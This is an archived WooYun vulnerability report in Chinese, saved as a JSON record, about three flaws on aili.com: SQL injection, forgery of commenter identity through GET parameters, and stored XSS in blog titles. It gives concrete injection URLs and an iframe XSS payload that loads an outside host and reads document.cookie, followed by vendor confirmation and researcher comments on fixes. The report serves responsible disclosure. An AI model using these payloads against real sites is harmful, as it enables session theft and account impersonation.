{"id": 64351, "wybug_id": "wooyun-2013-026152", "wybug_title": "爱丽网10分钟3洞，SQL注射+伪造身份+XSS", "wybug_corp": "aili.com", "wybug_author": "random_", "wybug_date": "2013-06-17 16:59", "wybug_open_date": "2013-08-01 16:59", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-01：\t细节向公众公开  简要描述： 奔着爱丽网的慷慨去的，没想到10分钟3洞，我恬不知耻的要20 详细说明：  1.试用中心try分站一个sql注入点，溢出报错，显语句http://try.aili.com/usercenter/otherjour/1015756.html?page=2111111111111111111111111\n\n2.爱丽网伪造别人留言，留言时get的，把用户名参数改成想要伪造的用户名即可http://comment.aili.com/index.php?m=comments&content=rtytf111111111111ryr&anonymity=0&uname=admin&uid=1037158&oid=1079&sid=5&title=dfffffffffffffffff&jsonpcallback=jsonp1371457995977我测试的号是xx12cv，两个都是伪造的\n\n3.爱丽网日志xss日志标题xss，别的没有细试,客户端限制30字节直接控制台id.maxlength=200绕过，测试代码\n<iframe/src=//tmxk.org/csrf onload=alert(document.cookie)>\n\n\n   漏洞证明：     修复方案：  参数控制   版权声明：转载请注明来源 random_@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-06-17 18:54 厂商回复： 3个漏洞，值！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-17 17:06 |    \t\t淡漠天空  \t\t\t( 实习白帽子  |\t\t\t        Rank:1113 漏洞数:142        | M:出售GOV  STATE NSA CIA NASA DHS Symant...)\t\t \n   random_agent    \n     2013-06-17 17:28 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  你说10分钟厂商就不给你那么多了，你应该说搞了好久才发现的，厂商就会给多点    \n     2013-06-17 17:43 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。目测你是三哥的马甲。。。    \n     2013-06-17 17:47 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @爱丽网  ...按理由 昨晚如果对所有服务器进行全局的 SQL注入防护。。。没道理还能那么轻易注入。。  有需要帮忙的。。 QQ我。。我帮你看看    \n     2013-06-17 17:53 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @px1624 膜拜三哥    \n     2013-06-17 17:54 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @逆雪寒 这个算侧漏？    \n     2013-06-17 17:55 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @Passer_by 目测爱丽网十世大好人    \n     2013-06-17 17:58 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @random_  不太可能~如果按照我说那样处理。。。根本没可能有侧漏。。除非有某台服务器没加防护。而那服务器也跑着PHP 。。。    \n     2013-06-17 18:10 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  膜拜楼主，我搞了一天没啥结果~    \n     2013-06-17 18:35 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @逆雪寒 html?name=xxxxxxxxxxxxxx    \n     2013-06-17 20:41 |    \t\t逆雪寒 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:13        | 脚本 运维架构)\t\t \n  @random_ @爱丽网 ....  html?name=xxxxxxxxxxxxxx   无非伪静态和pathinfo路径两种实现。。。看来是pathinfo实现的。。。才不经过GET 和POST 。。。跳过了360的过滤。。。。的确是个坑。修改下，如果pathinfo 是通过 $_SERVER['PATH_INFO']和$_SERVER['QUERY_STRING'] 实现的。那就过滤他们。    \n     2013-06-17 22:15 |    \t\trandom_ \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:50        | 推动开源推动网络安全)\t\t \n  @逆雪寒 学习了    \n     2013-08-07 10:41 |    \t\tsun \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:12        )\t\t \n  @逆雪寒 给力啊，学习了~    \n     2013-12-25 16:45 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  看看我是不是路人！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}